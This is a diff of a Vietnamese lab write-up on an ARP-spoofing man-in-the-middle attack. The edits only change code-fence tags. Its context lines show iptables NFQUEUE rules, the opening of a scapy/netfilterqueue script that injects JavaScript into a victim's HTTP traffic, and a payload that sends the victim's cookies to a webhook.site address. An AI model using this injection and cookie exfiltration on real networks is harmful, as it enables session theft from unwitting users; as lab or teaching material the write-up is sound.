@@ -36,7 +36,7 @@ xem bảng ARP mình được
 
 kiểm tra firewal trên máy attacker bằng lệnh
 
-```bash!
+```bash
 iptables -L -v
 ```
 
@@ -58,13 +58,13 @@ bậy giờ chúng ta sẽ xây dựng đoạn script để sửa đổi gói ti
 
 - mình dùng câu lệnh trong iptables là
 
-```bash!
+```bash
 iptables -A INPUT -j NFQUEUE --queue-num 0
 ```
 
 để lọc các gói khi đi vào trong máy tính attacker và chúng ta sẽ khai thác trên máy local của attacker và được đoạn code sau:
 
-```python!
+```python
 from scapy.all import *
 from colorama import init, Fore
 from netfilterqueue import NetfilterQueue
@@ -180,7 +180,7 @@ if __name__ == "__main__":
 
 - sau đó dùng module của python để tạo máy chủ web http chạy ở port 80 trên máy của attacker
 
-```bash!
+```bash
 python3 -m http.server  80
 ```
 
@@ -218,13 +218,13 @@ truy cập thử vào trên trình duyệt sẽ hiện trang html như sau với
 
 - mình sửa câu lệnh trong iptables thành
 
-```bash!
+```bash
 iptables -A FORWARD -j NFQUEUE --queue-num 0
 ```
 
 để lọc các gói khi đi đến các server khác ở đây là máy window 7 của victim và được đoạn code sau:
 
-```python!
+```python
 from scapy.all import *
 from colorama import init, Fore
 from netfilterqueue import NetfilterQueue
@@ -351,7 +351,7 @@ if __name__ == "__main__":
 - và mình đã trigger thành công!!!!
 - CTRL + U để view source code mình thấy đoạn javascript
 
-```javascript!
+```javascript
 <script>alert('Javascript Injected successfully!');</script>
 ```
 
@@ -372,7 +372,7 @@ mình xem gói tin bắt được trên wireshark ở máy attacker và thấy g
 - bây giờ bài toán đã trở thành khai thác tương tự như XSS
   - và mình sẽ đánh cắp cookie của nạn nhân với script
 
-```javascript!
+```javascript
 <script>document.location="https://webhook.site/c7194fa6-1757-4100-92bb-aa8f9c5d91ae?lay_duoc_cookie="+document.cookie;</script>
 ```
 
